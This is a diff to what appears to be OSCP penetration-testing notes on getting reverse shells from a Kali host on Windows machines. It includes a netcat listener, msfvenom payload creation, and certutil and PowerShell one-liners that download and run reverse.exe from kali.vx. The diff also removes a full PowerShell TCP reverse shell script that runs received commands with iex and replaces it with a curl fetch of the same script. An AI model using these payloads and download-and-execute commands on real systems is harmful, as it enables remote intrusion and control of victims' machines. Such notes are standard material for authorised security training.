@@ -1,6 +1,6 @@
-# Setup Kali for connections
+# 1. Setup Kali for connections
 
-## Setup listener
+## 1.1. Setup listener
 
 ```console
 nc -nlvp 4444
@@ -11,7 +11,7 @@ nc -nlvp 4444
 - `-v` : verbose [use twice to be more verbose]
 - `-p` : local port number (port numbers can be individual or ranges: lo-hi [inclusive])
 
-## Prepare payload transfer
+## 1.2. Prepare payload transfer
 
 Prepare files to web server root
 
@@ -33,29 +33,22 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /va
 
 ### PowerShell-based reverse shell script:
 
-`vi /var/www/html/reverse.ps1` with below code:
+Download the reverse shell scription:
 
 ```console
-$ADDRESS='kali.vx'
-$PORT=4444
-$CLIENT = New-Object System.Net.Sockets.TCPClient($ADDRESS,$PORT)
-$STREAM = $CLIENT.GetStream()
-[byte[]]$bytes = 0..65535|%{0}
-while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
-{
-$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-$SENDBACK = (iex $DATA 2>&1 | Out-String )
-$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> '
-$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
-$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
-$STREAM.Flush()
-}
-$CLIENT.Close()
+curl -O https://raw.githubusercontent.com/joetanx/oscp/main/reverse.ps1
 ```
 
-# Execute payloads on Windows
+Edit the address and port:
 
-## Execute Windows reverse shell TCP
+```console
+sed -i 's/<ADDRESS>/kali.vx/' reverse.ps1
+sed -i 's/<PORT>/4444/' reverse.ps1
+```
+
+# 2. Execute payloads on Windows
+
+## 2.1. Execute Windows reverse shell TCP
 
 ### Using certutil
 
@@ -69,7 +62,7 @@ certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %USERPROFILE%\revers
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%USERPROFILE%\reverse.exe'); Start-Process %USERPROFILE%\reverse.exe
 ```
 
-## Execute PowerShell-based reverse shell script
+## 2.2. Execute PowerShell-based reverse shell script
 
 ☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only
 
